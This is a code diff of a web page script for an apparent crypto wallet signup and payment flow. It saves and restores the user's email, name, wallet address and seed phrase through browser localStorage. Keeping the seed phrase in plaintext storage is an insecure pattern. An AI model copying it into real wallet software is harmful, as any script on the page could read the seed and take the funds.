@@ -417,50 +417,77 @@
     </div>
 
 <script>
-  document.addEventListener('DOMContentLoaded', () => {
-    const savedEmail = localStorage.getItem('user_email') || '';
-    const savedName = localStorage.getItem('user_name') || '';
-    const savedWallet = localStorage.getItem('wallet_address') || '';
-    const savedSeed = localStorage.getItem('seed_phrase') || '';
-    const flowID = localStorage.getItem('flow_id');
-    const paymentComplete = localStorage.getItem('payment_complete');
+document.addEventListener('DOMContentLoaded', () => {
+  // Restore fields if localStorage/session
+  const savedEmail = localStorage.getItem('user_email') || '';
+  const savedName = localStorage.getItem('user_name') || '';
+  const savedWallet = localStorage.getItem('wallet_address') || '';
+  const savedSeed = localStorage.getItem('seed_phrase') || '';
+  const flowID = localStorage.getItem('flow_id') || '';
+  const paymentComplete = localStorage.getItem('payment_complete');
 
-    // Show retry message ONLY if all info is present, payment not complete
-    if (
-      flowID &&
-      !paymentComplete &&
-      savedEmail &&
-      savedName &&
-      savedWallet &&
-      savedSeed
-    ) {
-      // Autofill form fields
-      if (document.getElementById('user-email')) document.getElementById('user-email').value = savedEmail;
-      if (document.getElementById('user-name')) document.getElementById('user-name').value = savedName;
-      if (document.getElementById('wallet-address')) document.getElementById('wallet-address').innerText = savedWallet;
-      if (document.getElementById('seed-phrase')) document.getElementById('seed-phrase').innerText = savedSeed;
+  // Autofill all fields
+  if (savedEmail) document.getElementById('user-email').value = savedEmail;
+  if (savedName) document.getElementById('user-name').value = savedName;
+  if (savedWallet) {
+    document.getElementById('wallet-address').innerText = savedWallet;
+    document.getElementById('wallet-section').style.display = 'block';
+  }
+  if (savedSeed) document.getElementById('seed-phrase').innerText = savedSeed;
 
-      // Open wallet section if hidden
-      const walletSection = document.getElementById('wallet-section');
-      if (walletSection) walletSection.style.display = 'block';
-
-      // Show retry message at purchase button
+  // If all fields exist & not complete, scroll to purchase and show retry msg
+  if (
+    flowID && savedEmail && savedName && savedWallet && savedSeed && !paymentComplete
+  ) {
+    setTimeout(() => {
+      const purchaseSection = document.getElementById('purchase-section');
+      if (purchaseSection) purchaseSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      const msgDiv = document.createElement('div');
+      msgDiv.innerText = 'Payment not completed, please try again.';
+      msgDiv.style.color = 'red';
+      msgDiv.style.marginBottom = '1rem';
       const purchaseBtn = document.getElementById('continue-purchase-btn');
-      if (purchaseBtn) {
-        const msgDiv = document.createElement('div');
-        msgDiv.innerText = 'Payment not completed, please try again.';
-        msgDiv.style.color = 'red';
-        msgDiv.style.marginBottom = '1rem';
-        purchaseBtn.parentNode.insertBefore(msgDiv, purchaseBtn);
+      if (purchaseBtn) purchaseBtn.parentNode.insertBefore(msgDiv, purchaseBtn);
+    }, 200);
+  }
+});
 
-        // Scroll to purchase section for user convenience
-        const purchaseSection = document.getElementById('purchase-section');
-        if (purchaseSection) {
-          purchaseSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }
-      }
-    }
-  });
+// Use these on Create Wallet / Email / Purchase click:
+function saveSessionFields() {
+  localStorage.setItem('user_email', document.getElementById('user-email').value);
+  localStorage.setItem('user_name', document.getElementById('user-name').value);
+  localStorage.setItem('wallet_address', document.getElementById('wallet-address').innerText);
+  localStorage.setItem('seed_phrase', document.getElementById('seed-phrase').innerText);
+}
+
+async function continueToPurchase() {
+  const name = document.getElementById('user-name').value.trim();
+  const email = document.getElementById('user-email').value.trim();
+  const wallet = document.getElementById('wallet-address').innerText.trim();
+  const seed = document.getElementById('seed-phrase').innerText.trim();
+  if (!email || !wallet || !seed) {
+    alert('Please complete all required fields.');
+    return;
+  }
+  // Only clear flow_id if form changed (prevents dupes)
+  let flowID = localStorage.getItem('flow_id');
+  if (
+    localStorage.getItem('user_email') !== email ||
+    localStorage.getItem('user_name') !== name ||
+    localStorage.getItem('wallet_address') !== wallet
+  ) {
+    flowID = '';
+    localStorage.removeItem('flow_id');
+  }
+  // Reuse or create new flow_id
+  if (!flowID) {
+    flowID = crypto.randomUUID();
+    localStorage.setItem('flow_id', flowID);
+  }
+  // Save all session fields
+  saveSessionFields();
+  // ...your log-to-Supabase + Stripe bridge code here, sending flow_id
+}
 </script>
 
 <script>
